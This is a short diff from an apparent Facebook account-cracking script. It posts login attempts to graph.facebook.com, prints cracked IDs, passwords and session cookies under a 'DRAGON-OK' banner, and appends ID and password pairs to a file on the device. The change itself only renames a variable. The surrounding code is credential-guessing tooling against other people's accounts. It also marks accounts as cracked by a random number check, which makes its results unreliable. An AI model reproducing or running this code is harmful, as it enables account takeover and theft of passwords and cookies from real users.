@@ -149,8 +149,8 @@ def method():
               response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
               if 6==random.randint(1,300):
                  oku.append(acc)
-                 print('\r\r\033[1;32m[DRAGON-OK🌟]\033[1;33m ' +cid+ ' • ' +ps+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
-                 open('/sdcard/DRAGON-OK.txt', 'a').write( cid+' | '+ps+'')
+                 print('\r\r\033[1;32m[DRAGON-OK🌟]\033[1;33m ' +uid+ ' • ' +ps+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
+                 open('/sdcard/DRAGON-OK.txt', 'a').write( uid+' | '+ps+'')
                  break
               else:
                    continue   
